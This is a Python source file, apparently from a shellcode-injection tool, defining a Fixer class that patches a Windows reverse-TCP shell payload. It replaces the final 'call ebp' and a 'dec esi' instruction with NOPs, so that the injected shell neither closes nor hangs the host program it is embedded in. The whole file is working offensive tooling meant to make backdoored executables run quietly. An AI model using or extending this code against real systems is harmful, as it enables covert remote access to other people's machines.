from __future__ import annotations
from inject.common import CommonMixin
from inject.opcodes import IX86_NOP


class Fixer(CommonMixin):
    def __init__(self, options: dict = None):
        options = options or {}
        self.should_fix = options.get("should_fix", True)
        super().__init__(options)

    # TODO: fix this, bad way to tell payload, (expects windows/shell_reverse_tcp)
    def apply(self, shellcode: Shellcode) -> bytes:
        new_shellcode = shellcode.shellcode
        new_shellcode = self.fix_call_ebp_closes_program(new_shellcode)
        new_shellcode = self.fix_wait_for_single_object(new_shellcode)
        return new_shellcode

    def fix_call_ebp_closes_program(self, shellcode: bytes):
        self.out("-- Fixing Closing ShellCode --")
        nsc = bytes()
        ins = self.get_ins_from_data(shellcode, take=-1)
        candidates = ins[len(ins) - 3 :]  # get last three
        if f"{candidates[0].mnemonic} {candidates[0].op_str}" == "push 0":
            if f"{candidates[1].mnemonic} {candidates[1].op_str}" == "push ebx":
                if f"{candidates[2].mnemonic} {candidates[2].op_str}" == "call ebp":
                    k = 0
                    for i in ins:
                        if k == len(ins) - 1:
                            self.out("[*] Removing 'call ebp' instruction")
                            nsc = nsc + IX86_NOP * len(i.bytes)
                        else:
                            nsc = nsc + i.bytes
                        k += 1
                    return nsc
        return shellcode

    # TODO: fix this, bad way to tell payload
    def fix_wait_for_single_object(self, shellcode: bytes):
        print("-- Fixing Hanging ShellCode --")
        nsc = bytes()
        one_matched = False
        two_matched = False
        k = 0
        for i in self.get_ins_from_data(shellcode, take=-1):
            if f"{i.mnemonic} {i.op_str}" == "call ebp":
                one_matched = k
            if f"{i.mnemonic} {i.op_str}" == "mov eax, esp" and one_matched == k - 1:
                two_matched = k
            if f"{i.mnemonic} {i.op_str}" == "dec esi" and two_matched == k - 1:
                self.out("[*] Removing 'dec esi' instruction")
                nsc = nsc + IX86_NOP * len(i.bytes)
            else:
                nsc = nsc + i.bytes
            k += 1
        return nsc
